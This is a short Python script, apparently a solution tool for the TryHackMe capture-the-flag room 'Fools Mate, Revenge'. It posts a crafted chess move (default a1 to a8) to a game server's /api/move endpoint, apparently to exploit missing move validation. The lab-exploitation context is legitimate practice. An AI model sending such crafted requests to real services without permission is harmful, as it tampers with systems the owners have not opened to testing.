import argparse
import requests
from datetime import datetime

AUTHOR = "cyber30"
ROOM = "Fools Mate, Revenge TryHackMe"
DATE = datetime.now().strftime("%Y-%m-%d")
DATE_CREATED = "2026-07-05"

def print_banner():
    banner = f"""
======================================================================================

   █████████  █████ █████ ███████████  ██████████ ███████████    ████████     █████   
  ███░░░░░███░░███ ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░░░███  ███░░░███ 
 ███     ░░░  ░░███ ███   ░███    ░███ ░███  █ ░  ░███    ░███ ░░░    ░███ ███   ░░███
░███           ░░█████    ░██████████  ░██████    ░██████████     ██████░ ░███    ░███
░███            ░░███     ░███░░░░░███ ░███░░█    ░███░░░░░███   ░░░░░░███░███    ░███
░░███     ███    ░███     ░███    ░███ ░███ ░   █ ░███    ░███  ███   ░███░░███   ███ 
 ░░█████████     █████    ███████████  ██████████ █████   █████░░████████  ░░░█████░  
  ░░░░░░░░░     ░░░░░    ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░  ░░░░░░░░     ░░░░░░   
                                                                                      
                                                                                                                              
    [+] Target Mover API Tool
    [+] Author: {AUTHOR}
    [+] Room: {ROOM}
    [+] Date Created:   {DATE_CREATED}
    [+] Date:   {DATE}
======================================================================================
"""
    print(banner)

def main():
    parser = argparse.ArgumentParser(description="Target Mover API Tool")
    
    parser.add_argument("host", help="Target host IP address (e.g., 10.130.186.221)")
    
    parser.add_argument("--from-pos", default="a1", help="Starting square (default: a1)")
    parser.add_argument("--to-pos", default="a8", help="Destination square (default: a8)")
    
    args = parser.parse_args()
    
    print_banner()
    
    PORT = 3000
    URL = f"http://{args.host}:{PORT}/api/move"
    
    payload = {
        "from": args.from_pos,
        "to": args.to_pos
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        print(f"[*] Sending request to {URL}...")
        print(f"[*] Payload: {payload}\n")
        
        response = requests.post(URL, json=payload, headers=headers)
        
        print(f"[+] Status Code: {response.status_code}")
        print("[+] Response Body:")
        print(response.text)
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Network Error: {e}")
    except Exception as e:
        print(f"[-] Unexpected Error: {e}")

if __name__ == "__main__":
    main()
